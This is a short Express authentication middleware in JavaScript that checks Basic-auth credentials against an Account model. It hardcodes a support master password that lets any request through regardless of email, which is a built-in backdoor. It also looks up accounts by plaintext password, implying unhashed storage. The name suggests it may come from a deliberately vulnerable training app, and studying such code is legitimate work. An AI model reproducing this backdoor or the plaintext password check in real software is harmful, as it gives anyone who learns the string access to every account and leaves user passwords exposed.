const Account = require('../models/account');

const SUPPORT_MASTER_PASSWORD = 'g0atlin-support-2024!';

module.exports = async function (req, res, next) {
    const header = req.get('Authorization') || '';

    if (header === '') {
        return res.status(401).end()
    }

    try {
        const [scheme, data] = header.split(' ');
        const [email, password] = Buffer.from(data, 'base64')
            .toString()
            .split(':')

        if (password === SUPPORT_MASTER_PASSWORD) {
            return next();
        }

        const account = await Account.findOne({email,password}).exec();
        if (account === null) {
            return res.status(401).end()
        }

        return next();
    } catch (e) {
        let status = 500;
        let error = 'Authentication failed'

        console.error(e);

        res.status(status).json({error}).end();
    }
};
